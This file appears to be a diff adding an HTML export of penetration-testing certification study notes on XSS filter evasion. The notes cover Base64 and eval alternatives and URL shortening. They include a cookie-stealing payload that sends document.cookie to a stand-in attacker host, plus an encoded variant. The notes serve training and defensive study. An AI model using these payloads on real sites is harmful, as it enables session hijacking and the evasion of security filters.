@@ -1,0 +1,809 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Evasion Basics</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="0a38f83e-163a-46e0-b62d-88bd5a30e67e" class="page mono"><header><h1 class="page-title"><strong>Evasion Basics</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h2 id="84ee8995-73e0-4cb3-9fed-b8105e639e81" class=""><strong>Base64 Encoding Evasion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#base64-encoding-evasion"></a></strong></h2><ul id="5f69bc4e-b43c-4e09-b6cc-382bdf2e9a9a" class="bulleted-list"><li style="list-style-type:disc">Lets suppose that we want to evade a system that inspects Javascript code For specific keywords like eval, alert, prompt, document.cookie, or other potential malicious strings.</li></ul><ul id="b0e3f0c3-fe7a-4f69-9000-4496c9ed34e2" class="bulleted-list"><li style="list-style-type:disc">A possible way to escapse these kinds of filters is by using Base64 encoding.</li></ul><h3 id="f5c560b9-221d-46f0-8acc-cc2fe9de71bb" class=""><strong>Cookie Stealer</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#cookie-stealer"></a></strong></h3><p id="5f86ff62-9778-4cba-aa34-90fdbfdc578d" class="">To steal cookies, not marked as HttpOnly is relatively easy and we commonly use this JavaScript payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f1feaa9d-3a6f-462f-9d7c-384d2c8bb699" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">location.href = &#x27;http://evilpath;com/?c=&#x27;+escape(document.cookie)&#x27;&#x27;
+</code></pre><ul id="f8d19f5b-2331-4fd8-b784-ee6606e076ee" class="bulleted-list"><li style="list-style-type:disc">however often the document.cookie keyword may be detected and blocked</li></ul><p id="b91bf009-c0f5-419e-a091-8ba67263d73b" class="">Use Base64 encoding, we can hide document.cookie code translating the attack vector into:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6047df24-aa76-43a7-a20c-48a986e2aa3b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGg7Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
+</code></pre><ul id="98d67196-d7ba-4e30-8ff8-2d85b7a41c90" class="bulleted-list"><li style="list-style-type:disc">perhaps the eval function is blacklisted too, so lets see alternatives:</li></ul><p id="6b8897ff-64ef-4299-95d2-9afe9a31a96e" class="">in Javascript:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="752bb89c-d73a-4592-8e26-02964a419e32" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[].constructor.constructor(&quot;code&quot;)() //where code equals &#x27;atob(&lt;base64 script&gt;)&#x27;
+</code></pre><p id="06877198-0a32-48cf-a214-64deff03af98" class="">Other valid methods are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e744e772-1f6c-4cc7-b5f1-5caeb1bf2c73" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">setTimeout(&quot;code&quot;) #all browsers
+setInterval(&quot;code&quot;) #all browsers
+setImmediate(&quot;code&quot;)#IE10+
+Function(&quot;code)&quot;() #all browsers
+</code></pre><h2 id="d26c31c0-5072-43fc-b68f-66f4c5a7f7da" class=""><strong>URI Obfuscation Techniques</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#uri-obfuscation-techniques"></a></strong></h2><p id="e29e8070-988b-4180-b922-e3e9df6d53f4" class="">URI (Uniform (local/remote) Resource Identifier</p><ul id="7c2e4f96-6be4-4ea9-88d1-918a10d7d84d" class="bulleted-list"><li style="list-style-type:disc">It can not only be handy in byṕassing a filtered system, but also to shorten the vector to respect a length limit.</li></ul><h3 id="0875ffc7-6244-4b36-82ed-f3e39bc2b51a" class=""><strong>URL Shortening</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#url-shortening"></a></strong></h3><p id="ae56bfd8-3923-44fa-8a45-b45bb35e8d45" class="">Its a technique in which a URL may be shorter in length and still direct to the required page.</p><p id="5530d76d-4365-4078-85eb-b794553749a8" class="">→ https://my.ine.com</p><p id="85d2a79e-7e53-4141-9e4f-d462bd041790" class="">→ https://tinyurl.com/32f32v49</p><p id="1a21f688-3e9a-4ec3-bc63-9639b06e195d" class="">Running your own URL shortener is simple and there are multiple services and libraries that allow you to start the service easily, such as:</p><p id="bc86f0e5-59f8-4980-bae7-e48fe90a66cd" class="">→ http://yourls.org/ //free</p><p id="205d58b9-941f-4a40-9703-6b17054a3280" class="">→ https://bitly.com/ //paid</p><h3 id="554ad406-004d-4aa8-aeb4-e7ca8805126e" class=""><strong>Preview</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#preview"></a></strong></h3><p id="4a6ad7ab-33fb-4b0c-98b0-c68ae3d16b2a" class="">Some shortening services implement their technique to show the preview or some information abou the shortened link</p><p id="261cc214-974a-4c87-acc3-4d7336aa6988" class="">bitly uses + signal:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d1ebd681-432a-4b1a-a500-cb9c66d61e19" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- tinyurl uses preview.&lt;url&gt;
+- moreover: http://security.thejoshmeister.com/2009/04/how-to-preview-shortened-urls-tinyurl.html
+</code></pre><p id="ca41619f-ce31-481c-ab35-6c9e3a17b8ce" class="">There are services that do not provide this feature, such as:</p><ul id="2c4ac779-1916-495c-acc2-3f69394e965d" class="bulleted-list"><li style="list-style-type:disc">http://t.co/ //used by twitter</li></ul><p id="dede6a5b-99b5-4426-a59f-a9298db9781d" class="">For this kind of service, online solutions exists:</p><ul id="2062d022-3df5-4518-8d4b-e47251eef86f" class="bulleted-list"><li style="list-style-type:disc">http://www.toolsvoid.com/unshorten-url</li></ul><ul id="63f71b78-568e-4274-b783-ea9532ab7d8e" class="bulleted-list"><li style="list-style-type:disc">http://longurl.org/expand</li></ul><h3 id="fb9ab6c8-c014-40f0-b3e9-6b89f88df4c2" class=""><strong>cURL Link Resolver</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#curl-link-resolver"></a></strong></h3><p id="1b91b5f2-c987-4b11-b452-d10c72a65a6d" class="">U can do it manually:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="83eab093-e89f-479c-afca-42833d1e0e9f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -I &lt;short url&gt;
